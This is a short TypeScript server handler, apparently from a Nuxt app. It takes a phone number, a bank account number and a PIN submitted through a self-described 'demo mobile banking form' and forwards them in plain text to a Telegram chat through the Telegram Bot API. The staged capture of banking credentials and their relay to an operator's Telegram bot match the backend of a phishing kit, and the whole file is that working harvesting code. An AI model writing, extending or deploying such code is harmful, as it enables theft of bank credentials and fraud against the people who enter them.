export default defineEventHandler(async (event) => {
  try {
    const config = useRuntimeConfig()
    const body = await readBody<{
      stage?: 'phone' | 'reference'
      phone?: string
      referenceNumber?: string
      otpCode?: string
    }>(event)

    if (!config.telegramBotToken || !config.telegramChatId) {
      throw createError({
        statusCode: 500,
        statusMessage: 'Telegram configuration is missing'
      })
    }

    const phone = (body?.phone || '').trim()
    const referenceNumber = (body?.referenceNumber || '').trim()
    const otpCode = (body?.otpCode || '').trim()
    const stage = body?.stage || 'phone'

    if (!phone) {
      throw createError({
        statusCode: 400,
        statusMessage: 'Phone number is required'
      })
    }

    let text = [
      'Demo mobile banking form submission',
      `Stage: ${stage}`,
      `Phone: ${phone}`
    ]

    if (stage === 'reference') {
      if (!referenceNumber) {
        throw createError({
          statusCode: 400,
          statusMessage: 'Reference number is required'
        })
      }

      text.push(`Account Number: ${referenceNumber}`)
      text.push(`PIN Code: ${otpCode || 'not provided'}`)
    }

    const response = await $fetch<{
      ok: boolean
      description?: string
    }>(`https://api.telegram.org/bot${config.telegramBotToken}/sendMessage`, {
      method: 'POST',
      body: {
        chat_id: config.telegramChatId,
        text: text.join('\n')
      }
    })

    return {
      ok: response.ok
    }
  } catch (error: any) {
    console.error('Telegram send failed:', {
      message: error?.message,
      statusCode: error?.statusCode,
      statusMessage: error?.statusMessage,
      data: error?.data,
      cause: error?.cause?.message || error?.cause
    })

    throw createError({
      statusCode: 500,
      statusMessage: error?.data?.description || error?.statusMessage || 'Telegram request failed'
    })
  }
})
